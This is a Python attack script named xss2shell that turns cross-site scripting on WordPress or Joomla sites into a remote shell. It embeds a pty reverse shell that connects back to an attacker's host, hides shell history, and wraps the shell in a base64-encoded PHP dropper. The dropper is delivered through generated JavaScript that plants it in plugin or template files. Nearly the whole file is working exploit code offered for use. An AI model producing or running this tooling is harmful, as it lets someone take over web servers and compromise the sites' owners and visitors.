#!/usr/bin/python2
# -*- coding: utf-8 -*-
#python pty shell provided by infodox
import subprocess, base64, sys, urllib

rshell = """import os
import pty
import socket

lhost = "%s"
lport = %s

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()"""

print """
▐▄• ▄ .▄▄ · .▄▄ ·     ▪  ▪      .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
 █▌█▌▪▐█ ▀. ▐█ ▀.     ██ ██     ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
 ·██· ▄▀▀▀█▄▄▀▀▀█▄    ▐█·▐█·    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
▪▐█·█▌▐█▄▪▐█▐█▄▪▐█    ▐█▌▐█▌    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
•▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀     ▀▀▀▀▀▀     ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
"""

def help():
	print('''Usage:
  -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport] --[CMS]
  -> Custom php payload: ./xss2shell.py custom [payload.php] --[CMS]''')

def preparepayload(payload, cms):
	if cms == 'joomla':
		f = open('joomla.js').read()
	else:
		f = open('wordpress.js').read()
	payload = urllib.quote_plus(payload)
	payload = f % (payload)
	open('out.js', 'w').write(payload)
	print('[+] out.js generated!')

def genpayload(lhost, payload, rshell, cms):
	rshell = base64.b64encode(rshell % (lhost, lport))
	payload = '<?php file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py"); ?>' % (rshell)
	preparepayload(payload, cms)

try:
	if sys.argv[-1].lower() == '--wordpress':
		cms = 'wordpress'
		print('[+] Payload Location: /wp-content/plugins/akismet/index.php')
	elif sys.argv[-1].lower() == '--joomla':
		cms = 'joomla'
		print('[+] Payload Location: /administrator/templates/isis/pay.php')
	if sys.argv[1].lower() == 'custom':
		print('[+] Using custom payload: %s' % (sys.argv[2]))
		payload = open(sys.argv[2]).read()
		preparepayload(payload, cms)
	elif sys.argv[1].lower() == 'help':
		help()
	else:
		print('[+] Using default payload: python pty reverse shell')
		lhost = sys.argv[1]
		lport = sys.argv[2]
		genpayload(lhost, lport, rshell, cms)
except:
	help()
